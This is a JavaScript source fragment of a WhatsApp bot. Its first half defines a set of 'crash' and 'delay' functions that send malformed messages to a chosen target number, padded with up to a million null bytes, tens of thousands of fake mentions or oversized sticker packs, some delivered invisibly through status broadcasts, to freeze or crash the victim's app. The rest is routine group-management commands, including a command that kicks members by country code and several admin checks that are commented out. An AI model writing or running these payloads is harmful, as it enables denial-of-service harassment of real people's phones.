            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (show) {
    await PhistarBotInc.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "By NoGame👾",
            },
            content: undefined,
          },
        ],
      }
    );
  }
 }

async function glxFrcInvisible(PhistarBotInc, target) {
  try {
    for (let i = 0; i < 100; i++) {
      const msg = await generateWAMessageFromContent(
        target,
        {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: "NoGame ¿?",
              format: "EXTENSION_1"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: JSON.stringify({ flow_cta: "\u9999".repeat(90000) }),
              version: 3
            }
          }
        },
        {}
      );

      await PhistarBotInc.relayMessage(
        target,
        {
          groupStatusMessageV2: {
            message: msg.message
          }
        },
        { participant: { jid: target } }
      );
    }
  } catch (e) {
    console.error("error:", e);
  }
}

async function CInVisible(target, show = true) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "NoGame ¿?",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {}
  )

  await PhistarBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  })

  if (show) {
    await PhistarBotInc.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "Yy",
            },
            content: undefined,
          },
        ],
      }
    )
  }
}

async function spckfrz(PhistarBotInc, target) {
  try {
    const mentionedList = [
      "0@s.whatsapp.net",
      ...Array.from({ length: 1999 }, () =>
        `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
      )
    ];

    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            stickerPackMessage: {
              stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
              name: "ꦽ".repeat(60000),
              publisher: "ꦽ".repeat(60000),
              caption: "ꦽ".repeat(60000),
              stickers: [
                ...Array.from({ length: 4700 }, () => ({
                  fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                  isAnimated: false,
                  emojis: ["🦠", "🩸","\n","💥"],
                  accessibilityLabel: "",
                  stickerSentTs: "PnX-ID-msg",
                  isAvatar: true,
                  isAiSticker: true,
                  isLottie: true,
                  mimetype: "application/pdf"
                }))
              ],
              fileLength: "1073741824000",
              fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
              fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
              mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
              directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
              contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: mentionedList
              },
              packDescription: "",
              mediaKeyTimestamp: "1747502082",
              trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
              thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
              thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
              thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
              thumbnailHeight: 252,
              thumbnailWidth: 252,
              imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
              stickerPackSize: "999999999",
              stickerPackOrigin: "USER_CREATED",
            }
          }
        }
      },
      {}
    );

    await PhistarBotInc.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
  } catch (err) {
    console.error("XBlank Error:", err);
  }
}

async function VisibleX(target) {
  const msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "Ω",
      contentText: "NoGame ¿?",
      footerText: "NoGame ¿?",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " NoGame ¿? " + "\u0000".repeat(500000)
          },
          type: 1
        }
      ],
      headerType: 1
    }
  }, {})

  await PhistarBotInc.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  })
}

async function CVisible(target) {
  await PhistarBotInc.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "NoGame ¿?",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function gsglx(isTarget) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "🎭⃟༑⌁⃰𝐍𝐨𝐆𝐚𝐦𝐞 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "©️ running since 2020 to 20##?",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await PhistarBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

async function Blank2(PhistarBotInc, target) {
try {
const msg = generateWAMessageFromContent(target, {
  viewOnceMessage: {
    message: {
      interactiveMessage: {
        body: { text: "\u0000" },
        contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                flow_message_version: "3",
                flow_token: "unused",
                flow_id: "9876543210",
                flow_cta: "ោ៝".repeat(30000),
                flow_action: "form_submit",
                flow_action_payload: { from_id: null },
                icon: "PROMOTE"
              })
            }
          ],
          messageParamsJson: "{}".repeat(10000)
        }
      }
    }
  }
}, {});
  await PhistarBotInc.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
   });
  } catch (err) {
    console.error(err);
  }
}

async function invisibleDozer(PhistarBotInc, target) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u0000" },
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000),
              },
              contextInfo: {
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: Array.from(
                  { length: 42000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
              }
            }
          }
        }
      },
      {}
    );
    await PhistarBotInc.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
    throw new Error(err.message);
  }
}

async function delayJembut(PhistarBotInc, target) {
  try {
    const n = await PhistarBotInc.relayMessage(
      target,
      {
        extendedTextMessage: {
          text: "\u0000".repeat(10000),
          matchedText: "⃝꙰꙰꙰".repeat(10000),
          description: "Its Me NoGame",
          title: "᬴".repeat(10000),
          previewType: "NONE",
          jpegThumbnail: null,
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "⃝꙰꙰꙰",
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      },
      { participant: { jid: target } }
    );
    await PhistarBotInc.sendMessage(target, {
      delete: { fromMe: true, remoteJid: target, id: n }
    });
  } catch (err) {
    console.error("error:", err);
    throw new Error(err.message);
  }
}

async function galaxy(isTarget) {
  await PhistarBotInc.relayMessage("status@broadcast", {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: { 
            text: "🎭⃟༑⌁⃰𝐍𝐨𝐆𝐚𝐦𝐞 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(522500)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            fromMe: true,
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "༑ Fail Beta - ( NoGame ) \"👋\"",
              newsletterJid: "120363319314627296@newsletter",
              serverMessageId: 1
            },
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: "©️ running since 2020 to 20##?",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: 'address_message',
                  paramsJson: "\u0000".repeat(522500),
                  version: 3
                }
              }
            }
          }
        }
      }
    }
  }, {
    statusJidList: [isTarget],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: isTarget }, content: [] }]
      }]
    }]
  });
}

async function ExperimentDelay2(PhistarBotInc, target, mention) {
  try {
    let sxo = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "NoGame¿?",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "galaxy_message",
          }
        }
      }
    }, {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });

    await sleep(1000);

    let sXoMessage = {
      extendedTextMessage: {
        text: "ꦾ".repeat(300000),
        contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 850 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            )
          ]
        }
      }
    };

    const xso = generateWAMessageFromContent(target, sXoMessage, {});

    await PhistarBotInc.relayMessage("status@broadcast", xso.message, {
      messageId: xso.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]
        }]
      }]
    });

    if (mention) {
      await PhistarBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: xso.key.id,
              type: 25,
            },
          },
        },
      }, {});
    }

    await sleep(1000);

    await PhistarBotInc.relayMessage("status@broadcast", sxo.message, {
      messageId: sxo.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [
            { tag: "to", attrs: { jid: target }, content: undefined }
          ]
        }]
      }]
    });

    if (mention) {
      await PhistarBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: sxo.key.id,
              type: 25,
            },
          },
        },
      }, {});
    }
  } catch (error) {
    console.error("Error in :", error, "Tai Mrk");
  }
}


// ✅ Command switch
switch (command) {
    case 'antilink': {
    if (!m.isGroup) return replyphistar("Only group");
    if (!isCreator) return replyphistar("This command is restricted to owner only");

    if (args.length < 2)
        return replyphistar(
            `Example:\n` +
            `${prefix + command} delete on/off\n` +
            `${prefix + command} warn on/off\n` +
            `${prefix + command} kick on/off`
        );

    const mode = args[0].toLowerCase();
    const status = args[1].toLowerCase();

    if (!['delete', 'warn', 'kick'].includes(mode))
        return replyphistar("❌ Invalid mode! Use: delete / warn / kick");

    if (!['on', 'off'].includes(status))
        return replyphistar("❌ Invalid status! Use: on / off");

    const antilinkModes = JSON.parse(
        fs.readFileSync('./database/antilink.json', 'utf-8') || '{}'
    );

    // OFF
    if (status === 'off') {
        if (!antilinkGroups.includes(m.chat))
            return replyphistar("❌ Anti-Link is already disabled in this group.");

        const updatedGroups = antilinkGroups.filter(g => g !== m.chat);
        fs.writeFileSync('./database/banned.json', JSON.stringify(updatedGroups, null, 2));

        delete antilinkModes[m.chat];
        fs.writeFileSync('./database/antilink.json', JSON.stringify(antilinkModes, null, 2));

        return replyphistar(`✅ Anti-Link (${mode}) has been disabled in this group.`);
    }

    // ON
    if (!antilinkGroups.includes(m.chat)) {
        antilinkGroups.push(m.chat);
        fs.writeFileSync('./database/banned.json', JSON.stringify(antilinkGroups, null, 2));
    }

    antilinkModes[m.chat] = mode;
    fs.writeFileSync('./database/antilink.json', JSON.stringify(antilinkModes, null, 2));

    replyphistar(`✅ Anti-Link has been enabled in *${mode.toUpperCase()}* mode.`);
    }
    break;
    
    case 'welcome':
        if (!m.isGroup) return replyphistar(mess.group)
    
        
        if (args.length < 1) return replyphistar(`Example: ${prefix + command} on/off`)
        
        const autoWelcomeGroups = JSON.parse(fs.readFileSync('./database/autowelcome.json', 'utf-8') || '[]')
        
        if (args[0].toLowerCase() === 'on') {
            if (autoWelcomeGroups.includes(m.chat)) return replyphistar("✅ Auto-welcome is already activated in this group.")
            autoWelcomeGroups.push(m.chat)
            fs.writeFileSync('./database/autowelcome.json', JSON.stringify(autoWelcomeGroups, null, 2))
            replyphistar("Welcome has been activated.")
        } else if (args[0].toLowerCase() === 'off') {
            if (!autoWelcomeGroups.includes(m.chat)) return replyphistar("❌ Auto-welcome is already disabled for this group.")
            const updatedGroups = autoWelcomeGroups.filter(group => group !== m.chat)
            fs.writeFileSync('./database/autowelcome.json', JSON.stringify(updatedGroups, null, 2))
            replyphistar("✅ Auto-welcome has been disabled for this group.")
        } else {
            replyphistar(`❌ Invalid option! Use:\n- *${prefix + command} on* to enable\n- *${prefix + command} off* to disable.`)
        }
        break;
    
    case 'antispam':
        if (!m.isGroup) return replyphistar(mess.group)
        
        if (args.length < 1) return replyphistar(`Example: ${prefix + command} on/off`)
        
        const antispamGroups = JSON.parse(fs.readFileSync('./database/antispam.json', 'utf-8') || '[]')
        
        if (args[0].toLowerCase() === 'on') {
            if (antispamGroups.includes(m.chat)) return replyphistar("✅ Anti-spam is already activated in this group.")
            antispamGroups.push(m.chat)
            fs.writeFileSync('./database/antispam.json', JSON.stringify(antispamGroups, null, 2))
            replyphistar("Anti-Spam has been activated.")
        } else if (args[0].toLowerCase() === 'off') {
            if (!antispamGroups.includes(m.chat)) return replyphistar("❌ Anti-spam is already disabled for this group.")
            const updatedGroups = antispamGroups.filter(group => group !== m.chat)
            fs.writeFileSync('./database/antispam.json', JSON.stringify(updatedGroups, null, 2))
            replyphistar("✅ Anti-spam has been disabled for this group.")
        } else {
            replyphistar(`❌ Invalid option! Use:\n- *${prefix + command} on* to enable\n- *${prefix + command} off* to disable.`)
        }
        break;
    
    case 'antiword':
        if (!m.isGroup) return replyphistar(mess.group)
        // Ligne supprimée: if (!isAdmins && !isCreator) return replyphistar(mess.admin)
        if (!isBotAdmins) return replyphistar(mess.botAdmin)
        
        const antiwordGroups = JSON.parse(fs.readFileSync('./database/antiword.json', 'utf-8') || '{}')
        
        if (!antiwordGroups[m.chat]) antiwordGroups[m.chat] = { enabled: false, bannedWords: [] }
        
        if (args.length < 1) {
            return replyphistar(`Example: ${prefix + command} on/off/add/remove <word>`)
        }
        
        if (args[0].toLowerCase() === 'on') {
            if (antiwordGroups[m.chat].enabled) return replyphistar("✅ Anti-word is already activated in this group.")
            antiwordGroups[m.chat].enabled = true
            fs.writeFileSync('./database/antiword.json', JSON.stringify(antiwordGroups, null, 2))
            replyphistar("✅ Anti-Word has been activated.")
        } else if (args[0].toLowerCase() === 'off') {
            if (!antiwordGroups[m.chat].enabled) return replyphistar("❌ Anti-Word is already disabled for this group.")
            antiwordGroups[m.chat].enabled = false
            fs.writeFileSync('./database/antiword.json', JSON.stringify(antiwordGroups, null, 2))
            replyphistar("✅ Anti-Word has been disabled for this group.")
        } else if (args[0].toLowerCase() === 'add') {
            if (args.length < 2) return replyphistar("❌ Please provide a word to add. Example: !antiword add badword")
            const word = args.slice(1).join(' ').toLowerCase()
            if (antiwordGroups[m.chat].bannedWords.includes(word)) return replyphistar(`❌ "${word}" is already in the banned words list.`)
            antiwordGroups[m.chat].bannedWords.push(word)
            fs.writeFileSync('./database/antiword.json', JSON.stringify(antiwordGroups, null, 2))
            replyphistar(`✅ "${word}" has been added to the banned words list.`)
        } else if (args[0].toLowerCase() === 'remove') {
            if (args.length < 2) return replyphistar("❌ Please provide a word to remove. Example: !antiword remove badword")
            const word = args.slice(1).join(' ').toLowerCase()
            if (!antiwordGroups[m.chat].bannedWords.includes(word)) return replyphistar(`❌ "${word}" is not in the banned words list.`)
            antiwordGroups[m.chat].bannedWords = antiwordGroups[m.chat].bannedWords.filter(w => w !== word)
            fs.writeFileSync('./database/antiword.json', JSON.stringify(antiwordGroups, null, 2))
            replyphistar(`✅ "${word}" has been removed from the banned words list.`)
        } else {
            replyphistar(`❌ Invalid option! Use:\n- *${prefix + command} on* to enable\n- *${prefix + command} off* to disable\n- *${prefix + command} add <word>* to add a banned word\n- *${prefix + command} remove <word>* to remove a banned word`)
        }
        break;
    
    case 'antilinkkick':
        if (!m.isGroup) return replyphistar('This command can only be used in groups.');
        // Ligne supprimée: if (!isAdmins && !isCreator) return replyphistar('Only group admins can use this command.');
        if (!isBotAdmins) return replyphistar('Bot must be an admin to use this command.');
        
        const antilinkkickGroups = JSON.parse(fs.readFileSync('./database/antilinkkick.json', 'utf-8') || '[]');
        
        if (args.length < 1) {
            return replyphistar(`Example: ${prefix + command} on/off`);
        }
        
        if (args[0] === 'on') {
            if (antilinkkickGroups.includes(m.chat)) return replyphistar("✅ Anti-Link-Kick is already activated in this group.");
            antilinkkickGroups.push(m.chat);
            fs.writeFileSync('./database/antilinkkick.json', JSON.stringify(antilinkkickGroups, null, 2));
            replyphistar("✅ Anti-Link-Kick has been activated in this group.");
        } else if (args[0] === 'off') {
            if (!antilinkkickGroups.includes(m.chat)) return replyphistar("❌ Anti-Link-Kick is already disabled for this group.");
            const updatedGroups = antilinkkickGroups.filter(group => group !== m.chat);
            fs.writeFileSync('./database/antilinkkick.json', JSON.stringify(updatedGroups, null, 2));
            replyphistar("✅ Anti-Link-Kick has been disabled for this group.");
        } else {
            replyphistar(`❌ Invalid option! Use:\n- *${prefix + command} on* to enable\n- *${prefix + command} off* to disable.`);
        }
        break;
    
    case 'antilinkwarn':
        if (!m.isGroup) return replyphistar(mess.group)
        // Ligne supprimée: if (!isAdmins && !isCreator) return replyphistar(mess.admin)
        if (!isBotAdmins) return replyphistar(mess.botAdmin)
        
        const antilinkWarnGroups = JSON.parse(fs.readFileSync('./database/antilinkwarn.json', 'utf-8') || '[]')
        
        if (args.length < 1) {
            return replyphistar(`Example: ${prefix + command} on/off`)
        }
        
        if (args[0].toLowerCase() === 'on') {
            if (antilinkWarnGroups.includes(m.chat)) return replyphistar("✅ Anti-Link-Warn is already activated in this group.")
            antilinkWarnGroups.push(m.chat)
            fs.writeFileSync('./database/antilinkwarn.json', JSON.stringify(antilinkWarnGroups, null, 2))
            replyphistar("✅ Anti-Link-Warn has been activated.")
        } else if (args[0].toLowerCase() === 'off') {
            if (!antilinkWarnGroups.includes(m.chat)) return replyphistar("❌ Anti-Link-Warn is already disabled for this group.")
            const updatedGroups = antilinkWarnGroups.filter(group => group !== m.chat)
            fs.writeFileSync('./database/antilinkwarn.json', JSON.stringify(updatedGroups, null, 2))
            replyphistar("✅ Anti-Link-Warn has been disabled for this group.")
        } else {
            replyphistar(`❌ Invalid option! Use:\n- *${prefix + command} on* to enable\n- *${prefix + command} off* to disable.`)
        }
        break;
   
       
case 'remove': {
    if (!m.isGroup) return replyphistar('ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜsᴇᴅ ɪɴ ɢʀᴏᴜᴘs.');
    if (!isBotAdmins) return replyphistar('ʙᴏᴛ ᴍᴜsᴛ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.');
    if (!isGroupOwner) return replyphistar('ᴏɴʟʏ ɢʀᴏᴜᴘ ᴏᴡɴᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.');
    
    const countryCode = args[0]; // Get the country code from the command arguments
    if (!countryCode || !countryCode.startsWith('+')) return replyphistar('ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ, e.g., +55.');

    let kickedMembers = 0;

    for (let participant of participants) {
        const number = participant.id.split('@')[0]; // Extract the participant's number
        if (number.startsWith(countryCode.replace('+', '')) && participant.id !== botNumber && participant.id !== groupOwner) {
            try {
                await PhistarBotInc.groupParticipantsUpdate(from, [participant.id], 'remove');
                kickedMembers++;
                await delay(2000); // Add a delay of 2 seconds between each removal
            } catch (err) {
                console.error(`Failed to remove ${participant.id}:`, err);
            }
        }
    }

    if (kickedMembers > 0) {
        replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇᴍᴏᴠᴇᴅ ${kickedMembers} ᴍᴇᴍʙᴇʀs ᴡɪᴛʜ ɴᴜᴍʙᴇʀs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ ${countryCode}.`);
    } else {
        replyphistar(`ɴᴏ ᴍᴇᴍʙᴇʀs ғᴏᴜɴᴅ ᴡɪᴛʜ ɴᴜᴍʙᴇʀs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ ${countryCode}.`);
    }
    break;
}
case 'promoteall': {
    if (!m.isGroup) return replyphistar("ɢʀᴏᴜᴘ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ.")
    
    if (!isCreator) return replyphistar("ᴏᴡɴᴇʀ ᴏɴʟʏ.")
    
if (participants.length > 200) {
 return replyphistar("⚠️ Too many members (max 200 for this order))");
 }
    
    const metadata = await PhistarBotInc.groupMetadata(m.chat)
    let users = metadata.participants.filter((u) => !u.admin && u.id !== botNumber)
    
    for (let user of users) {
        await PhistarBotInc.groupParticipantsUpdate(m.chat, [user.id], 'promote')
        await sleep(1000)
    }
    replyphistar(`✅ ᴘʀᴏᴍᴏᴛᴇᴅ ${users.length} ᴜsᴇʀs ᴛᴏ ᴀᴅᴍɪɴ`)
}
break
            case 'shutdown':
                if (!isCreator) return replyphistar(mess.owner)
                replyphistar(`Goodbye🖐🥺`)
                await sleep(3000)
                process.exit()
                break
            case 'autobio':
                if (!isCreator) return replyphistar(mess.owner)
                if (args.length < 1) return replyphistar(`Example ${prefix + command} on/off`)
                if (q == 'on') {
                    autobio = true
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏʙɪᴏ ᴛᴏ ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴀᴜᴛᴏʙɪᴏ ᴛᴏ ${q}`)
                }
                break
            case 'setexif':
                if (!isCreator) return replyphistar(mess.owner)
                if (!text) return replyphistar(`ᴇxᴀᴍᴘʟᴇ : ${prefix + command} ᴘᴀᴄᴋɴᴀᴍᴇ|ᴀᴜᴛʜᴏʀ`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                replyphistar(`ᴇxɪғ sᴜᴄᴄᴇssғᴜʟʟʏ ᴄʜᴀɴɢᴇᴅ ᴛᴏ\n\n• ᴘᴀᴄᴋɴᴀᴍᴇ : ${global.packname}\n• Author : ${global.author}`)
                break
            
            case 'block':
    if (!isCreator) return replyphistar(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let blockUser = m.chat;

        // Perform the block operation
        await PhistarBotInc.updateBlockStatus(blockUser, 'block');
        replyphistar(`✅ sᴜᴄᴄᴇssғᴜʟʟʏ ʙʟᴏᴄᴋᴇᴅ ᴛʜᴇ ᴜsᴇʀ ɪɴ ᴛʜɪs ᴅᴍ: ${blockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replyphistar('❌ Failed to block the user. Please ensure the bot has the required permissions.');
    }
    break;
            case 'unblock':
    if (!isCreator) return replyphistar(mess.owner); // Only the bot owner can execute this command

    try {
        // Fetch the recipient's JID (the chat where the command is sent)
        let unblockUser = m.chat;

        // Perform the unblock operation
        await PhistarBotInc.updateBlockStatus(unblockUser, 'unblock');
        replyphistar(`✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴜɴʙʟᴏᴄᴋᴇᴅ ᴛʜᴇ ᴜsᴇʀ ɪɴ ᴛʜɪs ᴅᴍ: ${unblockUser}`);
    } catch (err) {
        console.error(err); // Log the error for debugging
        replyphistar('❌ Failed to unblock the user. Please ensure the bot has the required permissions.');
    }
    break;
            
            case 'dessources':
                if (!isCreator) return replyphistar(mess.owner)
                if (m.isGroup) return replyphistar(mess.private)
                replyphistar(mess.wait)
                exec('zip backup.zip *')
                let malas = await fs.readFileSync('./backup.zip')
                await PhistarBotInc.sendMessage(m.chat, {
                    document: malas,
                    mimetype: 'application/zip',
                    fileName: 'backup.zip'
                }, {
                    quoted: qtext2
                })
                break
            case 'bcgc':
            case 'bcgroup': {
                if (!isCreator) return replyphistar(mess.owner)
                if (!text) return replyphistar(`Which text?\n\nExample : ${prefix + command} It's holiday tomorrow `)
                let getGroups = await PhistarBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replyphistar(`sᴇɴᴅ ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ${anu.length} ɢʀᴏᴜᴘ ᴄʜᴀᴛ, ᴇɴᴅ ᴛɪᴍᴇ ${anu.length * 1.5} sᴇᴄᴏɴᴅ`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
                    PhistarBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'ʙʀᴏᴀᴅᴄᴀsᴛ ʙʏ ᴏᴡɴᴇʀ',
                                body: `sᴇɴᴛ ${i.length} ɢʀᴏᴜᴘ`,
                                thumbnailUrl: 'https://i.postimg.cc/BvY75gbx/IMG-20250625-WA0221.jpg',
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replyphistar(`sᴜᴄᴄᴇssғᴜʟʟʏ sᴇɴᴛ ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ ${anu.length} ɢʀᴏᴜᴘ`)
            }
            break
                case 'autostatusview':
    if (!isCreator) return replyphistar(mess.owner);
    if (args.length < 1) return replyphistar(`ᴇxᴀᴍᴘʟᴇ ${prefix + command} ᴏɴ/ᴏғғ`);
    const phonenumber = PhistarBotInc.user?.id?.split(':')[0];
    if (!phonenumber) return replyphistar('❌ ʙᴏᴛ ɴᴏᴛ ᴄᴏɴɴᴇᴄᴛᴇᴅ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.');
    try {
        const { writeAutostatusview } = require('./BIGDADDY.js'); // Adjust path to your main script
        if (q === 'on') {
            PhistarBotInc.autostatusview = true;
            writeAutostatusview(phonenumber, 'on');
